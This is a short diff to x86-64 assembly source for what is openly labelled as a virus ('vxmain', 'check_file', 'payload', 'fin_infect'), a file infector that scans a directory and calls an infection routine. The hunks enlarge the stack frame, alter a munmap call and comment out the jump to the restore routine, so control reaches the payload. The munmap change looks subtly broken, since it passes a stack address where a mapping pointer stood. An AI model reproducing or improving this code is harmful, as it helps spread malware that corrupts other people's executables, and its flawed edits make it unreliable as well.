@@ -333,7 +333,7 @@ vxmain:
 vxstart:
 	push rbp
 	mov rbp, rsp
-	sub rsp, 0x1000
+	sub rsp, 0x2000
 	mov r14, rsp
 	jmp get_cwd
 ;****************************************************************************************
@@ -537,7 +537,7 @@ check_file:
 		jmp painting
 
 	checknext:
-		mov rdi, qword [r14 + 416]
+		lea rdi, qword [r14 + 416]
 		mov rsi, [r14 + 48] 			;filestat.st_size
 		mov rax, 0xB ;SYS_MUNMAP
 		syscall
@@ -546,7 +546,7 @@ check_file:
 		add cx, [rcx + r14 + 616] 		; linuxdirent.d_reclen
 		cmp qword rcx, [r14 + 500]
 		jne check_file
-		jmp _restore
+		;jmp _restore
 
 	painting:
 	call payload
@@ -924,7 +924,7 @@ fin_infect:
 PAGESIZE: dd 4096	
 ;;restore stack to original state
 _restore:
-	add rsp, 0x1000
+	add rsp, 0x2000
 	mov rsp, rbp
 	pop rbp
 
